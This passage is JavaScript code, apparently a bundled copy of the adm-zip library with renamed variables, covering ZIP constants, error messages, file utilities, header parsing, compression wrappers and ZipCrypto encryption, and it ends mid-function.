var B = Object.getOwnPropertyNames;
var r = (D, z) => function __require() {
  if (!z) {
    (0, D[B(D)[0]])((z = {
      exports: {}
    }).exports, z);
  }
  return z.exports;
};
const X = {
  "node_modules/adm-zip/util/constants.js": function (z, e) {
    e.exports = {
      LOCHDR: 30,
      LOCSIG: 67324752,
      LOCVER: 4,
      LOCFLG: 6,
      LOCHOW: 8,
      LOCTIM: 10,
      LOCCRC: 14,
      LOCSIZ: 18,
      LOCLEN: 22,
      LOCNAM: 26,
      LOCEXT: 28,
      EXTSIG: 134695760,
      EXTHDR: 16,
      EXTCRC: 4,
      EXTSIZ: 8,
      EXTLEN: 12,
      CENHDR: 46,
      CENSIG: 33639248,
      CENVEM: 4,
      CENVER: 6,
      CENFLG: 8,
      CENHOW: 10,
      CENTIM: 12,
      CENCRC: 16,
      CENSIZ: 20,
      CENLEN: 24,
      CENNAM: 28,
      CENEXT: 30,
      CENCOM: 32,
      CENDSK: 34,
      CENATT: 36,
      CENATX: 38,
      CENOFF: 42,
      ENDHDR: 22,
      ENDSIG: 101010256,
      ENDSUB: 8,
      ENDTOT: 10,
      ENDSIZ: 12,
      ENDOFF: 16,
      ENDCOM: 20,
      END64HDR: 20,
      END64SIG: 117853008,
      END64START: 4,
      END64OFF: 8,
      END64NUMDISKS: 16,
      ZIP64SIG: 101075792,
      ZIP64HDR: 56,
      ZIP64LEAD: 12,
      ZIP64SIZE: 4,
      ZIP64VEM: 12,
      ZIP64VER: 14,
      ZIP64DSK: 16,
      ZIP64DSKDIR: 20,
      ZIP64SUB: 24,
      ZIP64TOT: 32,
      ZIP64SIZB: 40,
      ZIP64OFF: 48,
      ZIP64EXTRA: 56,
      STORED: 0,
      SHRUNK: 1,
      REDUCED1: 2,
      REDUCED2: 3,
      REDUCED3: 4,
      REDUCED4: 5,
      IMPLODED: 6,
      DEFLATED: 8,
      ENHANCED_DEFLATED: 9,
      PKWARE: 10,
      BZIP2: 12,
      LZMA: 14,
      IBM_TERSE: 18,
      IBM_LZ77: 19,
      AES_ENCRYPT: 99,
      FLG_ENC: 1,
      FLG_COMP1: 2,
      FLG_COMP2: 4,
      FLG_DESC: 8,
      FLG_ENH: 16,
      FLG_PATCH: 32,
      FLG_STR: 64,
      FLG_EFS: 2048,
      FLG_MSK: 4096,
      FILE: 2,
      BUFFER: 1,
      NONE: 0,
      EF_ID: 0,
      EF_SIZE: 2,
      ID_ZIP64: 1,
      ID_AVINFO: 7,
      ID_PFS: 8,
      ID_OS2: 9,
      ID_NTFS: 10,
      ID_OPENVMS: 12,
      ID_UNIX: 13,
      ID_FORK: 14,
      ID_PATCH: 15,
      ID_X509_PKCS7: 20,
      ID_X509_CERTID_F: 21,
      ID_X509_CERTID_C: 22,
      ID_STRONGENC: 23,
      ID_RECORD_MGT: 24,
      ID_X509_PKCS7_RL: 25,
      ID_IBM1: 101,
      ID_IBM2: 102,
      ID_POSZIP: 18064,
      EF_ZIP64_OR_32: 4294967295,
      EF_ZIP64_OR_16: 65535,
      EF_ZIP64_SUNCOMP: 0,
      EF_ZIP64_SCOMP: 8,
      EF_ZIP64_RHO: 16,
      EF_ZIP64_DSN: 24
    };
  }
};
var require_constants = r(X);
var require_errors = r({
  "node_modules/adm-zip/util/errors.js"(z) {
    var Q = {
      INVALID_LOC: "Invalid LOC header (bad signature)",
      INVALID_CEN: "Invalid CEN header (bad signature)",
      INVALID_END: "Invalid END header (bad signature)",
      DESCRIPTOR_NOT_EXIST: "No descriptor present",
      DESCRIPTOR_UNKNOWN: "Unknown descriptor format",
      DESCRIPTOR_FAULTY: "Descriptor data is malformed",
      NO_DATA: "Nothing to decompress",
      BAD_CRC: "CRC32 checksum failed {0}",
      FILE_IN_THE_WAY: "There is a file in the way: {0}",
      UNKNOWN_METHOD: "Invalid/unsupported compression method",
      AVAIL_DATA: "inflate::Available inflate data did not terminate",
      INVALID_DISTANCE: "inflate::Invalid literal/length or distance code in fixed or dynamic block",
      TO_MANY_CODES: "inflate::Dynamic block code description: too many length or distance codes",
      INVALID_REPEAT_LEN: "inflate::Dynamic block code description: repeat more than specified lengths",
      INVALID_REPEAT_FIRST: "inflate::Dynamic block code description: repeat lengths with no first length",
      INCOMPLETE_CODES: "inflate::Dynamic block code description: code lengths codes incomplete",
      INVALID_DYN_DISTANCE: "inflate::Dynamic block code description: invalid distance code lengths",
      INVALID_CODES_LEN: "inflate::Dynamic block code description: invalid literal/length code lengths",
      INVALID_STORE_BLOCK: "inflate::Stored block length did not match one's complement",
      INVALID_BLOCK_TYPE: "inflate::Invalid block type (type == 3)",
      CANT_EXTRACT_FILE: "Could not extract the file",
      CANT_OVERRIDE: "Target file already exists",
      DISK_ENTRY_TOO_LARGE: "Number of disk entries is too large",
      NO_ZIP: "No zip file was loaded",
      NO_ENTRY: "Entry doesn't exist",
      DIRECTORY_CONTENT_ERROR: "A directory cannot have content",
      FILE_NOT_FOUND: "File not found: \"{0}\"",
      NOT_IMPLEMENTED: "Not implemented",
      INVALID_FILENAME: "Invalid filename",
      INVALID_FORMAT: "Invalid or unsupported zip format. No END header found",
      INVALID_PASS_PARAM: "Incompatible password parameter",
      WRONG_PASSWORD: "Wrong Password",
      COMMENT_TOO_LONG: "Comment is too long",
      EXTRA_FIELD_PARSE_ERROR: "Extra field parsing error"
    };
    function h(c) {
      return function (...U) {
        if (U.length) {
          c = c.replace(/\{(\d)\}/g, (f, N) => U[N] || "");
        }
        return new Error("ADM-ZIP: " + c);
      };
    }
    for (const c of Object.keys(Q)) {
      z[c] = h(Q[c]);
    }
  }
});
var require_utils = r({
  "node_modules/adm-zip/util/utils.js"(D, z) {
    var fsystem = require("fs");
    var e = require("path");
    var Q = require_constants();
    var h = require_errors();
    var c = typeof process === "object" && process.platform === "win32";
    var U = I => typeof I === "object" && I !== null;
    var f = new Uint32Array(256).map((I, Y) => {
      for (let H = 0; H < 8; H++) {
        if ((Y & 1) !== 0) {
          Y = Y >>> 1 ^ -306674912;
        } else {
          Y >>>= 1;
        }
      }
      return Y >>> 0;
    });
    function N(I) {
      this.sep = e.sep;
      this.fs = fsystem;
      if (U(I) && U(I.fs) && typeof I.fs.statSync === "function") {
        this.fs = I.fs;
      }
    }
    z.exports = N;
    N.prototype.makeDir = function (I) {
      const Y = this;
      function H(fpath) {
        let J = fpath.split(Y.sep)[0];
        fpath.split(Y.sep).forEach(function (K) {
          if (!K || K.substr(-1, 1) === ":") {
            return;
          }
          J += Y.sep + K;
          var M;
          try {
            M = Y.fs.statSync(J);
          } catch (j) {
            Y.fs.mkdirSync(J);
          }
          if (M && M.isFile()) {
            throw h.FILE_IN_THE_WAY("\"" + J + "\"");
          }
        });
      }
      H(I);
    };
    N.prototype.writeFileTo = function (path2, I, Y, H) {
      const J = this;
      if (J.fs.existsSync(path2)) {
        if (!Y) {
          return false;
        }
        var K = J.fs.statSync(path2);
        if (K.isDirectory()) {
          return false;
        }
      }
      var M = e.dirname(path2);
      if (!J.fs.existsSync(M)) {
        J.makeDir(M);
      }
      var j;
      try {
        j = J.fs.openSync(path2, "w", 438);
      } catch (L) {
        J.fs.chmodSync(path2, 438);
        j = J.fs.openSync(path2, "w", 438);
      }
      if (j) {
        try {
          J.fs.writeSync(j, I, 0, I.length, 0);
        } finally {
          J.fs.closeSync(j);
        }
      }
      J.fs.chmodSync(path2, H || 438);
      return true;
    };
    N.prototype.writeFileToAsync = function (path2, I, Y, H, J) {
      if (typeof H === "function") {
        J = H;
        H = undefined;
      }
      const K = this;
      K.fs.exists(path2, function (M) {
        if (M && !Y) {
          return J(false);
        }
        K.fs.stat(path2, function (j, L) {
          if (M && L.isDirectory()) {
            return J(false);
          }
          var p = e.dirname(path2);
          K.fs.exists(p, function (g) {
            if (!g) {
              K.makeDir(p);
            }
            K.fs.open(path2, "w", 438, function (u, C) {
              if (u) {
                K.fs.chmod(path2, 438, function () {
                  K.fs.open(path2, "w", 438, function (t0, t1) {
                    K.fs.write(t1, I, 0, I.length, 0, function () {
                      K.fs.close(t1, function () {
                        K.fs.chmod(path2, H || 438, function () {
                          J(true);
                        });
                      });
                    });
                  });
                });
              } else if (C) {
                K.fs.write(C, I, 0, I.length, 0, function () {
                  K.fs.close(C, function () {
                    K.fs.chmod(path2, H || 438, function () {
                      J(true);
                    });
                  });
                });
              } else {
                K.fs.chmod(path2, H || 438, function () {
                  J(true);
                });
              }
            });
          });
        });
      });
    };
    N.prototype.findFiles = function (path2) {
      const I = this;
      function Y(H, J, K) {
        if (typeof J === "boolean") {
          K = J;
          J = undefined;
        }
        let M = [];
        I.fs.readdirSync(H).forEach(function (j) {
          const path3 = e.join(H, j);
          const L = I.fs.statSync(path3);
          if (!J || J.test(path3)) {
            M.push(e.normalize(path3) + (L.isDirectory() ? I.sep : ""));
          }
          if (L.isDirectory() && K) {
            M = M.concat(Y(path3, J, K));
          }
        });
        return M;
      }
      return Y(path2, undefined, true);
    };
    N.prototype.findFilesAsync = function (I, Y) {
      const H = this;
      let J = [];
      H.fs.readdir(I, function (K, M) {
        if (K) {
          return Y(K);
        }
        let j = M.length;
        if (!j) {
          return Y(null, J);
        }
        M.forEach(function (L) {
          L = e.join(I, L);
          H.fs.stat(L, function (p, g) {
            if (p) {
              return Y(p);
            }
            if (g) {
              J.push(e.normalize(L) + (g.isDirectory() ? H.sep : ""));
              if (g.isDirectory()) {
                H.findFilesAsync(L, function (u, C) {
                  if (u) {
                    return Y(u);
                  }
                  J = J.concat(C);
                  if (! --j) {
                    Y(null, J);
                  }
                });
              } else if (! --j) {
                Y(null, J);
              }
            }
          });
        });
      });
    };
    N.prototype.getAttributes = function () {};
    N.prototype.setAttributes = function () {};
    N.crc32update = function (I, Y) {
      return f[(I ^ Y) & 255] ^ I >>> 8;
    };
    N.crc32 = function (I) {
      if (typeof I === "string") {
        I = Buffer.from(I, "utf8");
      }
      let Y = I.length;
      let H = ~0;
      for (let J = 0; J < Y;) {
        H = N.crc32update(H, I[J++]);
      }
      return ~H >>> 0;
    };
    N.methodToString = function (I) {
      switch (I) {
        case Q.STORED:
          return "STORED (" + I + ")";
        case Q.DEFLATED:
          return "DEFLATED (" + I + ")";
        default:
          return "UNSUPPORTED (" + I + ")";
      }
    };
    N.canonical = function (path2) {
      if (!path2) {
        return "";
      }
      const I = e.posix.normalize("/" + path2.split("\\").join("/"));
      return e.join(".", I);
    };
    N.zipnamefix = function (path2) {
      if (!path2) {
        return "";
      }
      const I = e.posix.normalize("/" + path2.split("\\").join("/"));
      return e.posix.join(".", I);
    };
    N.findLast = function (I, Y) {
      if (!Array.isArray(I)) {
        throw new TypeError("arr is not array");
      }
      const H = I.length >>> 0;
      for (let J = H - 1; J >= 0; J--) {
        if (Y(I[J], J, I)) {
          return I[J];
        }
      }
      return undefined;
    };
    N.sanitize = function (I, Y) {
      I = e.resolve(e.normalize(I));
      var H = Y.split("/");
      for (var J = 0, K = H.length; J < K; J++) {
        var path2 = e.normalize(e.join(I, H.slice(J, K).join(e.sep)));
        if (path2.indexOf(I) === 0) {
          return path2;
        }
      }
      return e.normalize(e.join(I, e.basename(Y)));
    };
    N.toBuffer = function I(Y, H) {
      if (Buffer.isBuffer(Y)) {
        return Y;
      } else if (Y instanceof Uint8Array) {
        return Buffer.from(Y);
      } else if (typeof Y === "string") {
        return H(Y);
      } else {
        return Buffer.alloc(0);
      }
    };
    N.readBigUInt64LE = function (Y, H) {
      var J = Buffer.from(Y.slice(H, H + 8));
      J.swap64();
      return parseInt("0x" + J.toString("hex"));
    };
    N.fromDOS2Date = function (Y) {
      return new Date((Y >> 25 & 127) + 1980, Math.max((Y >> 21 & 15) - 1, 0), Math.max(Y >> 16 & 31, 1), Y >> 11 & 31, Y >> 5 & 63, (Y & 31) << 1);
    };
    N.fromDate2DOS = function (Y) {
      let H = 0;
      let J = 0;
      if (Y.getFullYear() > 1979) {
        H = (Y.getFullYear() - 1980 & 127) << 9 | Y.getMonth() + 1 << 5 | Y.getDate();
        J = Y.getHours() << 11 | Y.getMinutes() << 5 | Y.getSeconds() >> 1;
      }
      return H << 16 | J;
    };
    N.isWin = c;
    N.crcTable = f;
  }
});
var require_fattr = r({
  "node_modules/adm-zip/util/fattr.js"(D, z) {
    var e = require("path");
    z.exports = function (path2, {
      fs: fs2
    }) {
      var _path = path2 || "";
      var Q = c();
      var h = null;
      function c() {
        const U = {
          directory: false,
          readonly: false,
          hidden: false,
          executable: false,
          mtime: 0,
          atime: 0
        };
        return U;
      }
      if (_path && fs2.existsSync(_path)) {
        h = fs2.statSync(_path);
        Q.directory = h.isDirectory();
        Q.mtime = h.mtime;
        Q.atime = h.atime;
        Q.executable = (h.mode & 73) !== 0;
        Q.readonly = (h.mode & 128) === 0;
        Q.hidden = e.basename(_path)[0] === ".";
      } else {
        console.warn("Invalid path: " + _path);
      }
      return {
        get directory() {
          return Q.directory;
        },
        get readOnly() {
          return Q.readonly;
        },
        get hidden() {
          return Q.hidden;
        },
        get mtime() {
          return Q.mtime;
        },
        get atime() {
          return Q.atime;
        },
        get executable() {
          return Q.executable;
        },
        decodeAttributes: function () {},
        encodeAttributes: function () {},
        toJSON: function () {
          const U = {
            path: _path,
            isDirectory: Q.directory,
            isReadOnly: Q.readonly,
            isHidden: Q.hidden,
            isExecutable: Q.executable,
            mTime: Q.mtime,
            aTime: Q.atime
          };
          return U;
        },
        toString: function () {
          return JSON.stringify(this.toJSON(), null, "\t");
        }
      };
    };
  }
});
var require_decoder = r({
  "node_modules/adm-zip/util/decoder.js"(D, z) {
    z.exports = {
      efs: true,
      encode: e => Buffer.from(e, "utf8"),
      decode: e => e.toString("utf8")
    };
  }
});
var require_util = r({
  "node_modules/adm-zip/util/index.js"(D, z) {
    z.exports = require_utils();
    z.exports.Constants = require_constants();
    z.exports.Errors = require_errors();
    z.exports.FileAttr = require_fattr();
    z.exports.decoder = require_decoder();
  }
});
var require_entryHeader = r({
  "node_modules/adm-zip/headers/entryHeader.js"(D, z) {
    var e = require_util();
    var Q = e.Constants;
    z.exports = function () {
      var h = 20;
      var c = 10;
      var U = 0;
      var f = 0;
      var N = 0;
      var I = 0;
      var Y = 0;
      var H = 0;
      var J = 0;
      var K = 0;
      var M = 0;
      var j = 0;
      var L = 0;
      var p = 0;
      var _offset = 0;
      h |= e.isWin ? 2560 : 768;
      U |= Q.FLG_EFS;
      const u = {
        extraLen: 0
      };
      const C = t2 => Math.max(0, t2) >>> 0;
      const t0 = t2 => Math.max(0, t2) & 65535;
      const t1 = t2 => Math.max(0, t2) & 255;
      N = e.fromDate2DOS(new Date());
      return {
        get made() {
          return h;
        },
        set made(t2) {
          h = t2;
        },
        get version() {
          return c;
        },
        set version(t2) {
          c = t2;
        },
        get flags() {
          return U;
        },
        set flags(t2) {
          U = t2;
        },
        get flags_efs() {
          return (U & Q.FLG_EFS) > 0;
        },
        set flags_efs(t2) {
          if (t2) {
            U |= Q.FLG_EFS;
          } else {
            U &= ~Q.FLG_EFS;
          }
        },
        get flags_desc() {
          return (U & Q.FLG_DESC) > 0;
        },
        set flags_desc(t2) {
          if (t2) {
            U |= Q.FLG_DESC;
          } else {
            U &= ~Q.FLG_DESC;
          }
        },
        get method() {
          return f;
        },
        set method(t2) {
          switch (t2) {
            case Q.STORED:
              this.version = 10;
            case Q.DEFLATED:
            default:
              this.version = 20;
          }
          f = t2;
        },
        get time() {
          return e.fromDOS2Date(this.timeval);
        },
        set time(t2) {
          this.timeval = e.fromDate2DOS(t2);
        },
        get timeval() {
          return N;
        },
        set timeval(t2) {
          N = C(t2);
        },
        get timeHighByte() {
          return t1(N >>> 8);
        },
        get crc() {
          return I;
        },
        set crc(t2) {
          I = C(t2);
        },
        get compressedSize() {
          return Y;
        },
        set compressedSize(t2) {
          Y = C(t2);
        },
        get size() {
          return H;
        },
        set size(t2) {
          H = C(t2);
        },
        get fileNameLength() {
          return J;
        },
        set fileNameLength(t2) {
          J = t2;
        },
        get extraLength() {
          return K;
        },
        set extraLength(t2) {
          K = t2;
        },
        get extraLocalLength() {
          return u.extraLen;
        },
        set extraLocalLength(t2) {
          u.extraLen = t2;
        },
        get commentLength() {
          return M;
        },
        set commentLength(t2) {
          M = t2;
        },
        get diskNumStart() {
          return j;
        },
        set diskNumStart(t2) {
          j = C(t2);
        },
        get inAttr() {
          return L;
        },
        set inAttr(t2) {
          L = C(t2);
        },
        get attr() {
          return p;
        },
        set attr(t2) {
          p = C(t2);
        },
        get fileAttr() {
          return (p || 0) >> 16 & 4095;
        },
        get offset() {
          return _offset;
        },
        set offset(t2) {
          _offset = C(t2);
        },
        get encrypted() {
          return (U & Q.FLG_ENC) === Q.FLG_ENC;
        },
        get centralHeaderSize() {
          return Q.CENHDR + J + K + M;
        },
        get realDataOffset() {
          return _offset + Q.LOCHDR + u.fnameLen + u.extraLen;
        },
        get localHeader() {
          return u;
        },
        loadLocalHeaderFromBinary: function (t2) {
          var t3 = t2.slice(_offset, _offset + Q.LOCHDR);
          if (t3.readUInt32LE(0) !== Q.LOCSIG) {
            throw e.Errors.INVALID_LOC();
          }
          u.version = t3.readUInt16LE(Q.LOCVER);
          u.flags = t3.readUInt16LE(Q.LOCFLG);
          u.method = t3.readUInt16LE(Q.LOCHOW);
          u.time = t3.readUInt32LE(Q.LOCTIM);
          u.crc = t3.readUInt32LE(Q.LOCCRC);
          u.compressedSize = t3.readUInt32LE(Q.LOCSIZ);
          u.size = t3.readUInt32LE(Q.LOCLEN);
          u.fnameLen = t3.readUInt16LE(Q.LOCNAM);
          u.extraLen = t3.readUInt16LE(Q.LOCEXT);
          const t4 = _offset + Q.LOCHDR + u.fnameLen;
          const t5 = t4 + u.extraLen;
          return t2.slice(t4, t5);
        },
        loadFromBinary: function (t2) {
          if (t2.length !== Q.CENHDR || t2.readUInt32LE(0) !== Q.CENSIG) {
            throw e.Errors.INVALID_CEN();
          }
          h = t2.readUInt16LE(Q.CENVEM);
          c = t2.readUInt16LE(Q.CENVER);
          U = t2.readUInt16LE(Q.CENFLG);
          f = t2.readUInt16LE(Q.CENHOW);
          N = t2.readUInt32LE(Q.CENTIM);
          I = t2.readUInt32LE(Q.CENCRC);
          Y = t2.readUInt32LE(Q.CENSIZ);
          H = t2.readUInt32LE(Q.CENLEN);
          J = t2.readUInt16LE(Q.CENNAM);
          K = t2.readUInt16LE(Q.CENEXT);
          M = t2.readUInt16LE(Q.CENCOM);
          j = t2.readUInt16LE(Q.CENDSK);
          L = t2.readUInt16LE(Q.CENATT);
          p = t2.readUInt32LE(Q.CENATX);
          _offset = t2.readUInt32LE(Q.CENOFF);
        },
        localHeaderToBinary: function () {
          var t2 = Buffer.alloc(Q.LOCHDR);
          t2.writeUInt32LE(Q.LOCSIG, 0);
          t2.writeUInt16LE(c, Q.LOCVER);
          t2.writeUInt16LE(U, Q.LOCFLG);
          t2.writeUInt16LE(f, Q.LOCHOW);
          t2.writeUInt32LE(N, Q.LOCTIM);
          t2.writeUInt32LE(I, Q.LOCCRC);
          t2.writeUInt32LE(Y, Q.LOCSIZ);
          t2.writeUInt32LE(H, Q.LOCLEN);
          t2.writeUInt16LE(J, Q.LOCNAM);
          t2.writeUInt16LE(u.extraLen, Q.LOCEXT);
          return t2;
        },
        centralHeaderToBinary: function () {
          var t2 = Buffer.alloc(Q.CENHDR + J + K + M);
          t2.writeUInt32LE(Q.CENSIG, 0);
          t2.writeUInt16LE(h, Q.CENVEM);
          t2.writeUInt16LE(c, Q.CENVER);
          t2.writeUInt16LE(U, Q.CENFLG);
          t2.writeUInt16LE(f, Q.CENHOW);
          t2.writeUInt32LE(N, Q.CENTIM);
          t2.writeUInt32LE(I, Q.CENCRC);
          t2.writeUInt32LE(Y, Q.CENSIZ);
          t2.writeUInt32LE(H, Q.CENLEN);
          t2.writeUInt16LE(J, Q.CENNAM);
          t2.writeUInt16LE(K, Q.CENEXT);
          t2.writeUInt16LE(M, Q.CENCOM);
          t2.writeUInt16LE(j, Q.CENDSK);
          t2.writeUInt16LE(L, Q.CENATT);
          t2.writeUInt32LE(p, Q.CENATX);
          t2.writeUInt32LE(_offset, Q.CENOFF);
          return t2;
        },
        toJSON: function () {
          const t2 = function (t3) {
            return t3 + " bytes";
          };
          return {
            made: h,
            version: c,
            flags: U,
            method: e.methodToString(f),
            time: this.time,
            crc: "0x" + I.toString(16).toUpperCase(),
            compressedSize: t2(Y),
            size: t2(H),
            fileNameLength: t2(J),
            extraLength: t2(K),
            commentLength: t2(M),
            diskNumStart: j,
            inAttr: L,
            attr: p,
            offset: _offset,
            centralHeaderSize: t2(Q.CENHDR + J + K + M)
          };
        },
        toString: function () {
          return JSON.stringify(this.toJSON(), null, "\t");
        }
      };
    };
  }
});
var require_mainHeader = r({
  "node_modules/adm-zip/headers/mainHeader.js"(D, z) {
    var e = require_util();
    var Q = e.Constants;
    z.exports = function () {
      var h = 0;
      var c = 0;
      var U = 0;
      var _offset = 0;
      var f = 0;
      return {
        get diskEntries() {
          return h;
        },
        set diskEntries(N) {
          h = c = N;
        },
        get totalEntries() {
          return c;
        },
        set totalEntries(N) {
          c = h = N;
        },
        get size() {
          return U;
        },
        set size(N) {
          U = N;
        },
        get offset() {
          return _offset;
        },
        set offset(N) {
          _offset = N;
        },
        get commentLength() {
          return f;
        },
        set commentLength(N) {
          f = N;
        },
        get mainHeaderSize() {
          return Q.ENDHDR + f;
        },
        loadFromBinary: function (N) {
          if ((N.length !== Q.ENDHDR || N.readUInt32LE(0) !== Q.ENDSIG) && (N.length < Q.ZIP64HDR || N.readUInt32LE(0) !== Q.ZIP64SIG)) {
            throw e.Errors.INVALID_END();
          }
          if (N.readUInt32LE(0) === Q.ENDSIG) {
            h = N.readUInt16LE(Q.ENDSUB);
            c = N.readUInt16LE(Q.ENDTOT);
            U = N.readUInt32LE(Q.ENDSIZ);
            _offset = N.readUInt32LE(Q.ENDOFF);
            f = N.readUInt16LE(Q.ENDCOM);
          } else {
            h = e.readBigUInt64LE(N, Q.ZIP64SUB);
            c = e.readBigUInt64LE(N, Q.ZIP64TOT);
            U = e.readBigUInt64LE(N, Q.ZIP64SIZE);
            _offset = e.readBigUInt64LE(N, Q.ZIP64OFF);
            f = 0;
          }
        },
        toBinary: function () {
          var N = Buffer.alloc(Q.ENDHDR + f);
          N.writeUInt32LE(Q.ENDSIG, 0);
          N.writeUInt32LE(0, 4);
          N.writeUInt16LE(h, Q.ENDSUB);
          N.writeUInt16LE(c, Q.ENDTOT);
          N.writeUInt32LE(U, Q.ENDSIZ);
          N.writeUInt32LE(_offset, Q.ENDOFF);
          N.writeUInt16LE(f, Q.ENDCOM);
          N.fill(" ", Q.ENDHDR);
          return N;
        },
        toJSON: function () {
          const offset = function (N, I) {
            let offs = N.toString(16).toUpperCase();
            while (offs.length < I) {
              offs = "0" + offs;
            }
            return "0x" + offs;
          };
          return {
            diskEntries: h,
            totalEntries: c,
            size: U + " bytes",
            offset: offset(_offset, 4),
            commentLength: f
          };
        },
        toString: function () {
          return JSON.stringify(this.toJSON(), null, "\t");
        }
      };
    };
  }
});
var require_headers = r({
  "node_modules/adm-zip/headers/index.js"(D) {
    D.EntryHeader = require_entryHeader();
    D.MainHeader = require_mainHeader();
  }
});
var require_deflater = r({
  "node_modules/adm-zip/methods/deflater.js"(D, z) {
    z.exports = function (e) {
      var Q = require("zlib");
      var h = {
        chunkSize: (parseInt(e.length / 1024) + 1) * 1024
      };
      return {
        deflate: function () {
          return Q.deflateRawSync(e, h);
        },
        deflateAsync: function (c) {
          var U = Q.createDeflateRaw(h);
          var f = [];
          var N = 0;
          U.on("data", function (I) {
            f.push(I);
            N += I.length;
          });
          U.on("end", function () {
            var I = Buffer.alloc(N);
            var Y = 0;
            I.fill(0);
            for (var H = 0; H < f.length; H++) {
              var J = f[H];
              J.copy(I, Y);
              Y += J.length;
            }
            if (c) {
              c(I);
            }
          });
          U.end(e);
        }
      };
    };
  }
});
var require_inflater = r({
  "node_modules/adm-zip/methods/inflater.js"(D, z) {
    var e = +(process.versions ? process.versions.node : "").split(".")[0] || 0;
    z.exports = function (Q, h) {
      var c = require("zlib");
      const U = e >= 15 && h > 0 ? {
        maxOutputLength: h
      } : {};
      return {
        inflate: function () {
          return c.inflateRawSync(Q, U);
        },
        inflateAsync: function (f) {
          var N = c.createInflateRaw(U);
          var I = [];
          var Y = 0;
          N.on("data", function (H) {
            I.push(H);
            Y += H.length;
          });
          N.on("end", function () {
            var H = Buffer.alloc(Y);
            var J = 0;
            H.fill(0);
            for (var K = 0; K < I.length; K++) {
              var M = I[K];
              M.copy(H, J);
              J += M.length;
            }
            if (f) {
              f(H);
            }
          });
          N.end(Q);
        }
      };
    };
  }
});
var require_zipcrypto = r({
  "node_modules/adm-zip/methods/zipcrypto.js"(e, Q) {
    'use strict';

    var {
      randomFillSync: h
    } = require("crypto");
    var c = require_errors();
    var U = new Uint32Array(256).map((u, C) => {
      for (let t0 = 0; t0 < 8; t0++) {
        if ((C & 1) !== 0) {
          C = C >>> 1 ^ -306674912;
        } else {
          C >>>= 1;
        }
      }
      return C >>> 0;
    });
    var f = (u, C) => Math.imul(u, C) >>> 0;
    var N = (u, C) => {
      return U[(u ^ C) & 255] ^ u >>> 8;
    };
    var I = () => {
      if (typeof h === "function") {
        return h(Buffer.alloc(12));
      } else {
        return I.node();
      }
    };
    I.node = () => {
      const u = Buffer.alloc(12);
      const C = u.length;
      for (let t0 = 0; t0 < C; t0++) {
        u[t0] = Math.random() * 256 & 255;
      }
      return u;
    };
    const Y = {
      genSalt: I
    };
    var H = Y;
    function J(u) {
      const C = Buffer.isBuffer(u) ? u : Buffer.from(u);
      this.keys = new Uint32Array([305419896, 591751049, 878082192]);
      for (let t0 = 0; t0 < C.length; t0++) {
        this.updateKeys(C[t0]);
      }
    }
    J.prototype.updateKeys = function (u) {
      const C = this.keys;
      C[0] = N(C[0], u);
      C[1] += C[0] & 255;
      C[1] = f(C[1], 134775813) + 1;
      C[2] = N(C[2], C[1] >>> 24);
      return u;
    };
    J.prototype.next = function () {
      const u = (this.keys[2] | 2) >>> 0;
      return f(u, u ^ 1) >> 8 & 255;
    };
    function K(u) {
      const C = new J(u);
      return function (t0) {
        const t1 = Buffer.alloc(t0.length);
        let t2 = 0;
        for (let t3 of t0) {
          t1[t2++] = C.updateKeys(t3 ^ C.next());
        }
        return t1;
      };
    }
    function M(u) {
      const C = new J(u);
      return function (t0, t1, t2 = 0) {
        if (!t1) {
          t1 = Buffer.alloc(t0.length);
        }
        for (let t3 of t0) {
          const t4 = C.next();
          t1[t2++] = t3 ^ t4;
          C.updateKeys(t3);
        }
        return t1;
      };
    }
    function j(u, C, t0) {
      if (!u || !Buffer.isBuffer(u) || u.length < 12) {
        return Buffer.alloc(0);
      }
      const t1 = K(t0);
      const t2 = t1(u.slice(0, 12));
      const t3 = (C.flags & 8) === 8 ? C.timeHighByte : C.crc >>> 24;
      if (t2[11] !== t3) {
        throw c.WRONG_PASSWORD();
      }
      return t1(u.slice(12));
    }
    function L(u) {
      if (Buffer.isBuffer(u) && u.length >= 12) {
        H.genSalt = function () {
          return u.slice(0, 12);
        };
      } else if (u === "node") {
        H.genSalt = I.node;
      } else {
        H.genSalt = I;
      }
    }
    function p(u, C, t0, t1 = false) {
      if (u == null) {
        u = Buffer.alloc(0);
      }
      if (!Buffer.isBuffer(u)) {
        u = Buffer.from(u.toString());
      }
      const t2 = M(t0);
      const t3 = H.genSalt();
      t3[11] = C.crc >>> 24 & 255;
      if (t1) {
        t3[10] = C.crc >>> 16 & 255;
      }
      const t4 = Buffer.alloc(u.length + 12);
      t2(t3, t4);
      return t2(u, t4, 12);
    }
    const g = {
      decrypt: j,
      encrypt: p,
      _salter: L
    };
    Q.exports = g;
  }
});
var require_methods = r({
  "node_modules/adm-zip/methods/index.js"(D) {
    D.Deflater = require_deflater();
    D.Inflater = require_inflater();
    D.ZipCrypto = require_zipcrypto();
  }
});
var require_zipEntry = r({
  "node_modules/adm-zip/zipEntry.js"(D, z) {
    var e = require_util();
    var Q = require_headers();
    var h = e.Constants;
    var c = require_methods();
    z.exports = function (U, f) {
      var N = new Q.EntryHeader();
      var I = Buffer.alloc(0);
      var Y = Buffer.alloc(0);
      var H = false;
      var J = null;
      var K = Buffer.alloc(0);
      var M = Buffer.alloc(0);
      var _efs = true;
      const j = U;
      const L = typeof j.decoder === "object" ? j.decoder : e.decoder;
      _efs = L.hasOwnProperty("efs") ? L.efs : false;
      function p() {
        if (!f || !(f instanceof Uint8Array)) {
          return Buffer.alloc(0);
        }
        M = N.loadLocalHeaderFromBinary(f);
        return f.slice(N.realDataOffset, N.realDataOffset + N.compressedSize);
      }
      function g(t3) {
        if (!N.flags_desc) {
          if (e.crc32(t3) !== N.localHeader.crc) {
            return false;
          }
        } else {
          const t4 = {};
          const dataEndOffset = N.realDataOffset + N.compressedSize;
          if (f.readUInt32LE(dataEndOffset) == h.LOCSIG || f.readUInt32LE(dataEndOffset) == h.CENSIG) {
            throw e.Errors.DESCRIPTOR_NOT_EXIST();
          }
          if (f.readUInt32LE(dataEndOffset) == h.EXTSIG) {
            t4.crc = f.readUInt32LE(dataEndOffset + h.EXTCRC);
            t4.compressedSize = f.readUInt32LE(dataEndOffset + h.EXTSIZ);
            t4.size = f.readUInt32LE(dataEndOffset + h.EXTLEN);
          } else if (f.readUInt16LE(dataEndOffset + 12) === 19280) {
            t4.crc = f.readUInt32LE(dataEndOffset + h.EXTCRC - 4);
            t4.compressedSize = f.readUInt32LE(dataEndOffset + h.EXTSIZ - 4);
            t4.size = f.readUInt32LE(dataEndOffset + h.EXTLEN - 4);
          } else {
            throw e.Errors.DESCRIPTOR_UNKNOWN();
          }
          if (t4.compressedSize !== N.compressedSize || t4.size !== N.size || t4.crc !== N.crc) {
